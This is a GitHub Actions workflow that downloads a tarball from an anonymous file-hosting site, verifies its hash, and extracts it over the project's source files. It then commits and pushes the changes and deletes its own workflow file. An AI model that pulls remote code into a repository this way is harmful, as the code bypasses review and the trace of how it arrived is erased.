name: Apply SNCK upgrade
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Download and verify payload
        run: |
          curl -fsSL -o /tmp/snck-upgrade.tar.gz https://files.catbox.moe/5qdqg3.gz
          echo "82bbfa7cace9519ca915a69855dbf60af1b6047b0737ae521df93da60c818f1f  /tmp/snck-upgrade.tar.gz" | sha256sum -c -
          tar -xzf /tmp/snck-upgrade.tar.gz
      - name: Commit upgrade
        run: |
          git config user.name "SnckBoy"
          git config user.email "snckboy@users.noreply.github.com"
          git add src server.ts scripts/test-worlds-backups.mts package.json
          git commit -m "Add worlds, scheduled backups with restore and API key rotation"
          git push
      - name: Remove temporary workflow
        run: |
          git rm .github/workflows/apply-upgrade.yml
          git commit -m "Remove temporary upgrade workflow"
          git push
